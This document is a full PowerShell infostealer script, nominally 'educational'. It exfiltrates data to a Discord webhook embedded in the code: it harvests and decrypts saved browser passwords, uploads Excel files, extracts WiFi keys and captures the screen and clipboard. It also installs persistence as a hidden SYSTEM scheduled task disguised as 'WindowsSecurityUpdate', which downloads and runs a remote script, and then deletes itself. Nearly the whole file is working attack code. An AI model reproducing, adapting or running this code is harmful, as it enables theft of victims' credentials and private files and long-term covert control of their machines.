# ============================================
# WINDOWS 11 23H2 PAYLOAD
# GitHub: zorkclient/enigma
# Full Discord Exfiltration
# Educational purposes ONLY!
# made by inkrat
# ============================================

$webhook = "https://ptb.discord.com/api/webhooks/1484372266710995026/jhpU0776tLsCjRN_RiwfH5PFTHg1XaZQJOTcdw0FEBtANImdnEZ4cjf6sT_sh8mHgdbU"

# ============================================
# DISCORD FUNCTIONS
# ============================================

function Send-DiscordMessage {
    param($message)
    try {
        $body = @{
            content = $message
            username = "Win11-23H2-Exfil"
        } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
    } catch {}
}

function Send-DiscordFile {
    param($filePath, $caption)
    try {
        $multipart = @{
            file = Get-Item $filePath
            payload_json = @{content = $caption} | ConvertTo-Json
        }
        Invoke-RestMethod -Uri $webhook -Method Post -Form $multipart -UseBasicParsing
    } catch {}
}

function Send-DiscordEmbed {
    param($title, $description, $color = 5814783)
    try {
        $embed = @{
            title = $title
            description = $description
            color = $color
            timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ")
            footer = @{text = "Windows 11 23H2 Payload | $env:COMPUTERNAME"}
        }
        $body = @{
            embeds = @($embed)
            username = "Win11-Exfil"
        } | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
    } catch {}
}

# ============================================
# SYSTEM INFORMATION
# ============================================

$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$userDomain = $env:USERDOMAIN
$publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress
$osVersion = (Get-WmiObject Win32_OperatingSystem).Caption
$osBuild = (Get-WmiObject Win32_OperatingSystem).BuildNumber
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

$systemInfo = @"
**💻 SYSTEM INFORMATION**
`Computer:` $computerName
`User:` $userName
`Domain:` $userDomain
`Local IP:` $localIP
`Public IP:` $publicIP
`OS:` $osVersion
`Build:` $osBuild
`RAM:` $ram GB
`Time:` $(Get-Date)
"@

Send-DiscordEmbed -title "🎯 NEW TARGET ACQUIRED" -description $systemInfo -color 3066993

# ============================================
# CHROME CREDENTIAL HARVESTING
# ============================================

Send-DiscordMessage "🔐 **CHROME CREDENTIAL HARVESTING**"

function Get-ChromePasswords {
    $chromePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Login Data",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Login Data"
    )
    
    $allCredentials = @()
    
    foreach ($chromePath in $chromePaths) {
        if (Test-Path $chromePath) {
            $tempDb = "$env:temp\chrome_logins_$(Get-Random).db"
            Copy-Item $chromePath $tempDb -Force -ErrorAction SilentlyContinue
            
            try {
                Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
            } catch {}
            
            try {
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"
                $reader = $cmd.ExecuteReader()
                
                while ($reader.Read()) {
                    $url = $reader.GetString(0)
                    $username = $reader.GetString(1)
                    
                    # Try to decrypt password (Windows DPAPI)
                    $passwordBytes = $reader.GetValue(2)
                    if ($passwordBytes -is [byte[]] -and $passwordBytes.Length -gt 0) {
                        try {
                            $decrypted = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($passwordBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
                            $allCredentials += "[$url] $username : $decrypted"
                        } catch {
                            $allCredentials += "[$url] $username : [ENCRYPTED - UNABLE TO DECRYPT]"
                        }
                    } else {
                        $allCredentials += "[$url] $username : [NO PASSWORD]"
                    }
                }
                $conn.Close()
            } catch {
                $allCredentials += "[ERROR] Failed to read Chrome database"
            }
            
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        }
    }
    
    if ($allCredentials.Count -gt 0) {
        $credOutput = $allCredentials -join "`n"
        $chunks = [math]::Ceiling($credOutput.Length / 1900)
        
        Send-DiscordMessage "**Chrome Credentials Found:** $($allCredentials.Count)"
        
        for ($i = 0; $i -lt $chunks; $i++) {
            $chunk = $credOutput.Substring($i * 1900, [math]::Min(1900, $credOutput.Length - ($i * 1900)))
            Send-DiscordMessage "```$chunk```"
        }
    } else {
        Send-DiscordMessage "No Chrome credentials found"
    }
}

# Execute Chrome harvesting
Get-ChromePasswords

# ============================================
# BRAVE / EDGE / OPERA CREDENTIALS
# ============================================

Send-DiscordMessage "🌐 **OTHER BROWSER CREDENTIALS**"

$browsers = @{
    "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    "Opera" = "$env:APPDATA\Opera Software\Opera Stable\Login Data"
    "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data"
}

foreach ($browser in $browsers.Keys) {
    if (Test-Path $browsers[$browser]) {
        $tempDb = "$env:temp\${browser}_logins_$(Get-Random).db"
        Copy-Item $browsers[$browser] $tempDb -Force -ErrorAction SilentlyContinue
        
        try {
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value FROM logins WHERE username_value != ''"
            $reader = $cmd.ExecuteReader()
            $found = @()
            
            while ($reader.Read()) {
                $found += "$($reader.GetString(0)) -> $($reader.GetString(1))"
            }
            $conn.Close()
            
            if ($found.Count -gt 0) {
                Send-DiscordMessage "**$browser Credentials:** $($found.Count)"
                Send-DiscordMessage "```$($found -join "`n")```"
            }
        } catch {}
        
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    }
}

# ============================================
# EXCEL FILES (ALL .XLSX)
# ============================================

Send-DiscordMessage "📊 **EXCEL FILE EXFILTRATION**"

$excelFiles = @()
$searchPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\OneDrive",
    "C:\Users\*\Desktop",
    "C:\Users\*\Documents",
    "C:\Users\*\Downloads",
    "C:\Users\*\OneDrive"
)

foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        $files = Get-ChildItem -Path $path -Filter "*.xlsx" -File -ErrorAction SilentlyContinue
        $excelFiles += $files
    }
}

# Also search recursively in common folders
$recursivePaths = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop"
)

foreach ($path in $recursivePaths) {
    if (Test-Path $path) {
        $files = Get-ChildItem -Path $path -Filter "*.xlsx" -Recurse -File -ErrorAction SilentlyContinue | 
                 Where-Object { $_.FullName -notlike "*\AppData\*" }
        $excelFiles += $files
    }
}

$excelFiles = $excelFiles | Select-Object -Unique

Send-DiscordMessage "**Found $($excelFiles.Count) Excel files**"

# Create temp directory for exfiltration
$tempDir = "$env:temp\exfil_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

$fileList = @()
$fileIndex = 0

foreach ($file in $excelFiles) {
    try {
        $fileSize = [math]::Round($file.Length / 1KB, 2)
        $fileList += "$($file.FullName) - $fileSize KB"
        
        # Copy to temp for Discord upload
        $tempFile = "$tempDir\$($file.Name)"
        Copy-Item $file.FullName $tempFile -Force
        
        # Upload to Discord (max 8MB per file)
        if ($file.Length -lt 8MB) {
            Send-DiscordFile -filePath $tempFile -caption "📎 **$($file.Name)** | $fileSize KB | $computerName"
            $fileIndex++
            Start-Sleep -Milliseconds 500
        } else {
            Send-DiscordMessage "⚠️ File too large for Discord: $($file.Name) ($fileSize KB)"
        }
        
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    } catch {
        Send-DiscordMessage "❌ Failed to exfiltrate: $($file.Name)"
    }
}

# Send file list
if ($fileList.Count -gt 0) {
    $listOutput = "**Excel Files Found:**`n" + ($fileList -join "`n")
    $chunks = [math]::Ceiling($listOutput.Length / 1900)
    for ($i = 0; $i -lt $chunks; $i++) {
        $chunk = $listOutput.Substring($i * 1900, [math]::Min(1900, $listOutput.Length - ($i * 1900)))
        Send-DiscordMessage "```$chunk```"
    }
}

Remove-Item $tempDir -Force -Recurse -ErrorAction SilentlyContinue

# ============================================
# WIFI PASSWORDS
# ============================================

Send-DiscordMessage "📶 **WIFI CREDENTIALS**"

try {
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $profile = ($_ -split ":")[1].Trim()
        $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
        if ($password) {
            $pass = ($password -split ":")[1].Trim()
            "[$profile] $pass"
        } else {
            "[$profile] No password"
        }
    }
    
    if ($profiles) {
        $wifiOutput = $profiles -join "`n"
        $chunks = [math]::Ceiling($wifiOutput.Length / 1900)
        for ($i = 0; $i -lt $chunks; $i++) {
            $chunk = $wifiOutput.Substring($i * 1900, [math]::Min(1900, $wifiOutput.Length - ($i * 1900)))
            Send-DiscordMessage "**WiFi Networks:**`n```$chunk```"
        }
    } else {
        Send-DiscordMessage "No WiFi profiles found"
    }
} catch {
    Send-DiscordMessage "Failed to extract WiFi passwords"
}

# ============================================
# SCREENSHOT
# ============================================

Send-DiscordMessage "📸 **CAPTURING SCREENSHOT**"

try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
    
    $screenshotPath = "$env:temp\screenshot_$computerName.png"
    $bitmap.Save($screenshotPath)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    if (Test-Path $screenshotPath) {
        Send-DiscordFile -filePath $screenshotPath -caption "🖥️ **SCREENSHOT** - $computerName - $(Get-Date)"
        Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
    }
} catch {
    Send-DiscordMessage "❌ Screenshot failed: $_"
}

# ============================================
# RECENT FILES (LAST 7 DAYS)
# ============================================

Send-DiscordMessage "📁 **RECENT DOCUMENTS**"

$recentFiles = @()
$recentPaths = @(
    "$env:USERPROFILE\Desktop\*.*",
    "$env:USERPROFILE\Documents\*.*",
    "$env:USERPROFILE\Downloads\*.*"
)

foreach ($path in $recentPaths) {
    $files = Get-ChildItem -Path $path -File -ErrorAction SilentlyContinue | 
             Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) -and $_.Extension -in @('.docx','.xlsx','.pdf','.txt','.zip','.rar') } |
             Select-Object Name, LastWriteTime, @{Name="SizeKB";Expression={[math]::Round($_.Length/1KB,2)}}
    $recentFiles += $files
}

if ($recentFiles.Count -gt 0) {
    $recentOutput = ($recentFiles | Format-Table -AutoSize | Out-String)
    $chunks = [math]::Ceiling($recentOutput.Length / 1900)
    for ($i = 0; $i -lt $chunks; $i++) {
        $chunk = $recentOutput.Substring($i * 1900, [math]::Min(1900, $recentOutput.Length - ($i * 1900)))
        Send-DiscordMessage "**Recent Files (7 days):**`n```$chunk```"
    }
} else {
    Send-DiscordMessage "No recent files found"
}

# ============================================
# RUNNING PROCESSES
# ============================================

Send-DiscordMessage "⚙️ **RUNNING PROCESSES**"

try {
    $processes = Get-Process | Select-Object Name, CPU, WorkingSet64 -First 30 | 
                 Format-Table -AutoSize | Out-String
    Send-DiscordMessage "```$processes```"
} catch {}

# ============================================
# CLIPBOARD DATA
# ============================================

Send-DiscordMessage "📋 **CLIPBOARD DATA**"

try {
    Add-Type -AssemblyName System.Windows.Forms
    $clipboard = [System.Windows.Forms.Clipboard]::GetText()
    if ($clipboard -and $clipboard.Length -gt 0 -and $clipboard.Length -lt 1900) {
        Send-DiscordMessage "**Clipboard Contents:**`n```$clipboard```"
    } elseif ($clipboard.Length -gt 1900) {
        Send-DiscordMessage "**Clipboard Contents (truncated):**`n```$($clipboard.Substring(0,1900))```"
    }
} catch {}

# ============================================
# PERSISTENCE (Scheduled Task)
# ============================================

Send-DiscordMessage "💾 **INSTALLING PERSISTENCE**"

$payloadUrl = "https://raw.githubusercontent.com/zorkclient/enigma/refs/heads/main/fark.ps1"
$persistScript = @"
`$url = "$payloadUrl"
`$output = "`$env:temp\fark.ps1"
(New-Object System.Net.WebClient).DownloadFile(`$url, `$output)
powershell -Exec Bypass -File `$output
"@

$persistScript | Out-File "$env:temp\persist_fark.ps1" -Force

try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -WindowStyle Hidden -File `"$env:temp\persist_fark.ps1`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserID "SYSTEM" -LogonType ServiceAccount
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "WindowsSecurityUpdate" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
    Send-DiscordMessage "✅ Persistence installed (Scheduled Task: WindowsSecurityUpdate)"
} catch {
    Send-DiscordMessage "❌ Persistence installation failed: $_"
}

# ============================================
# CLEANUP & COMPLETION
# ============================================

Send-DiscordEmbed -title "✅ MISSION COMPLETE" -description "**Target:** $computerName`n**User:** $userName`n**IP:** $publicIP`n**Excel Files:** $($excelFiles.Count)`n**Chrome Creds:** $($allCredentials.Count)" -color 3066993

# Self-delete
Send-DiscordMessage "🧹 Cleaning up..."
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
